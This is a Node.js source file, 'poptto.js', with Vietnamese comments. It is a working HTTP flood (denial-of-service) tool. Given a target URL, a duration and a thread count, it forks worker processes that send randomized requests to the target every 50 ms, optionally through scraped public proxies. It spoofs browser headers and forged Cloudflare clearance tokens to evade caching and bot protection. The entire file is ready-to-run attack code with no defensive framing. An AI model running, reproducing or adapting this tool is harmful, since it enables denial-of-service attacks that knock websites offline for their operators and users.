// npm i request axios fake-useragent 

require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request');
const axios = require("axios");
const fs = require('fs');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');

// Thêm các mảng header từ paste.txt
const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store', 
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate'
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'en-CA,en;q=0.7',
    'fr-FR,fr;q=0.9',
    'fr-CA,fr;q=0.8',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9',
    'it-IT,it;q=0.9',
    'ja-JP,ja;q=0.9',
    'ko-KR,ko;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'ru-RU,ru;q=0.9',
    'en-US,en;q=0.7,es;q=0.3',
    'en-US,en;q=0.8,de;q=0.2',
    'en-US,en;q=0.6,fr;q=0.4'
];

// Hàm tiện ích lấy phần tử ngẫu nhiên từ mảng
function getRandomFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function randstr(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

// Tạo đường dẫn ngẫu nhiên để tránh cache
function generateRandomPath() {
    const queryType = Math.floor(Math.random() * 4);
    
    if (queryType === 0) {
        return '?s=' + randstr(10) + randstr(15);
    } else if (queryType === 1) {
        return '?token=' + randstr(12) + '_' + randstr(8) + '&flag=' + randstr(5); 
    } else if (queryType === 2) {
        return '?__cf_chl_tk=' + randstr(20) + '&__cf_chl_rt_tk=' + randstr(30) + '_' + randstr(12);
    } else {
        return '?' + randstr(6) + '=' + randstr(8) + '&' + randstr(7) + '=' + randstr(10);
    }
}

// Tạo tham số browser ngẫu nhiên cho User-Agent
function generateBrowserParams() {
    const browserVersion = Math.floor(Math.random() * (130 - 127 + 1)) + 127;
    const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge'];
    const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    
    return {
        browser: selectedBrowser,
        version: browserVersion
    };
}

async function poptto() {
    if (process.argv.length !== 6) {
        console.log("node poptto.js url times threads proxy/off/proxy.txt");
        process.exit(0);
    } else {
        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[4];
        const proxyOption = process.argv[5];

        if (cluster.isMaster) {
            console.clear();
            console.log(`Target: ${target}`);
            console.log(`Time: ${times} seconds`);
            console.log(`Threads: ${threads}`);
            console.log(`Proxy Option: ${proxyOption}`);
        }

        // Sửa lại hàm remove_by_value để hoạt động đúng
        Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
                if (this[i] === val) {
                    this.splice(i, 1);
                    i--;
                }
            }
            return this;
        }

        let proxies = [];
        
        if (process.argv[5] == 'off') {
            if (cluster.isMaster) console.log("OFF");
        } else if (process.argv[5] == 'proxy') {
            if (cluster.isMaster) console.log("PROXY");
            try {
                const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
                proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n').filter(proxy => proxy.trim() !== '');
                if (proxies.length === 0) {
                    console.log("No proxies found! Falling back to direct connection.");
                } else {
                    console.log(`Loaded ${proxies.length} proxies from API`);
                }
            } catch (error) {
                console.log("Error fetching proxies from API, falling back to direct connection");
            }
        } else {
            if (cluster.isMaster) console.log("PROXY");
            try {
                var proxyData = fs.readFileSync(process.argv[5], 'utf-8');
                proxies = proxyData.replace(/\r/g, '').split('\n').filter(proxy => proxy.trim() !== '');
                if (proxies.length === 0) {
                    console.log("No proxies found in file! Falling back to direct connection.");
                } else {
                    console.log(`Loaded ${proxies.length} proxies from file`);
                }
            } catch (error) {
                console.log("Error reading proxy file, falling back to direct connection");
            }
        }

        function createRequestConfig(useProxy = false) {
            const browserParams = generateBrowserParams();
            const randomPath = generateRandomPath();
            
            // Tạo User-Agent tùy chỉnh thay vì sử dụng fake-useragent
            const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${browserParams.version}.0.${Math.floor(Math.random() * 999) + 1000}.${Math.floor(Math.random() * 100)} Safari/604.1`;
            
            // Tạo header ngẫu nhiên với các giá trị từ mảng
            const headers = {
                'Accept': getRandomFromArray(accept_header),
                'Accept-Encoding': getRandomFromArray(encoding),
                'Accept-Language': getRandomFromArray(lang_header),
                'Cache-Control': getRandomFromArray(cache_header),
                'Pragma': 'no-cache',
                'Expires': '0',
                'User-Agent': userAgent,
                'Sec-Ch-Ua': `"${browserParams.browser}";v="${browserParams.version}", "Not=A?Brand";v="99"`,
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'Connection': Math.random() > 0.5 ? 'keep-alive' : 'close'
            };
            
            // Thêm cookie ngẫu nhiên trong một số trường hợp
            if (Math.random() > 0.7) {
                headers['Cookie'] = `session=${randstr(16)}; cf_clearance=${randstr(20)}_${randstr(1)}.${randstr(3)}.${randstr(10)}`;
            }
            
            const requestUrl = target + randomPath;
            
            const config = {
                method: 'get',
                url: requestUrl,
                headers: headers,
                timeout: 5000,
                followRedirect: Math.random() > 0.5
            };
            
            return config;
        }

        function run() {
            if (proxies.length > 0 && process.argv[5] !== 'off') {
                // Proxy mode
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const config = createRequestConfig(true);
                
                const proxiedRequest = request.defaults({
                    'proxy': 'http://' + proxy
                });
                
                proxiedRequest(config, function(error, response) {
                    if (error) {
                        // Xóa proxy không hoạt động
                        proxies = proxies.remove_by_value(proxy);
                        return;
                    }
                    
                    if (response && response.statusCode) {
                        console.log(`[${proxy}] ${response.statusCode} ${response.statusMessage || ''}`);
                        
                        if (response.statusCode >= 200 && response.statusCode <= 299) {
                            // Gửi nhiều yêu cầu trên proxy tốt
                            for (let i = 0; i < 50; i++) {
                                const floodConfig = createRequestConfig(true);
                                proxiedRequest(floodConfig, () => {});
                            }
                        } else if (response.statusCode >= 400) {
                            // Xóa proxy không hoạt động
                            proxies = proxies.remove_by_value(proxy);
                        }
                    }
                });
            } else {
                // Direct mode
                const config = createRequestConfig(false);
                
                request(config, function(error, response) {
                    if (error) {
                        return;
                    }
                    
                    if (response && response.statusCode) {
                        console.log(`[DIRECT] ${response.statusCode} ${response.statusMessage || ''}`);
                    }
                });
            }
        }

        function thread() {
            setInterval(() => {
                // Gửi nhiều yêu cầu cùng một lúc
                const reqCount = Math.floor(Math.random() * 10) + 1;
                for (let i = 0; i < reqCount; i++) {
                    run();
                }
            }, 50);  // Giảm thời gian chờ để tăng RPS
        }

        async function main() {
            if (cluster.isMaster) {
                for (let i = 0; i < threads; i++) {
                    cluster.fork();
                }
                cluster.on('exit', function(worker, code) {
                    if (code !== 0) {
                        console.log(`Worker ${worker.id} crashed. Starting a new worker...`);
                        cluster.fork();
                    }
                });
            } else {
                thread();
            }
        }

        main();
        setTimeout(() => {
            console.log('Attack ended.');
            process.exit(0)
        }, times * 1000);
    }
}

// Xử lý ngoại lệ để tránh crash
process.on('uncaughtException', function(err) {
    // console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', function(err) {
    // console.error('Unhandled Rejection:', err);
});

poptto();